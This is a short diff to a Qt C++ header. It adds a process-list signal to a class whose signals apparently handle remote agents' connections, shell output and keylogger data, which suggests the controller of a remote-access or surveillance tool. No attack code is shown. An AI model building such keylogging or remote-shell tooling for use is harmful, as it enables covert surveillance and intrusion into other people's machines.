@@ -42,6 +42,7 @@ signals:
     void agentConnected(const QString& ip, const QString& info);
     void agentDisconnected(const QString& ip);
     void shellOutputReceived(const QString& ip, const QString& output);
+    void processListReceived(const QString& ip, const QString& output);
     void keylogReceived(const QString& ip, const QString& data);
     void statusMessage(const QString& message);
 
